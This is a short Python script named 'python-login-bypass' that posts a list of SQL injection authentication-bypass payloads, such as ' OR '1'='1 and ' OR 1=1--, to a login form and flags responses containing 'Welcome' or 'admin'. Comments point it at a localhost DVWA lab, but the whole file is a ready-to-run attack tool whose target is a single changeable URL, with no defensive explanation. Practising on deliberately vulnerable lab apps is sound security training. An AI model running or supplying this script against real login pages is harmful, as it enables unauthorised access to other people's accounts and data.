# python-login-bypass
import requests

# Configurations (point to your ethical lab environment)
TARGET_URL = 'http://localhost/login.php'  # DVWA or test app URL
HEADERS = {'User-Agent': 'EthicalLoginTester/1.0'}
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR ''='",
    "' OR 1=1 LIMIT 1--",
    "' OR 'a'='a",
]

def test_login_bypass():
    for payload in PAYLOADS:
        data = {
            'username': payload,
            'password': payload
        }

        print(f"[*] Testing payload: {payload}")
        response = requests.post(TARGET_URL, data=data, headers=HEADERS)

        if "Welcome" in response.text or "admin" in response.text:
            print("[+] Potential bypass found!")
            print(f"Payload: {payload}")
            print("Response Snippet:", response.text[:200])
            break
        else:
            print("[-] Failed. Trying next...\n")

if __name__ == "__main__":
    test_login_bypass()
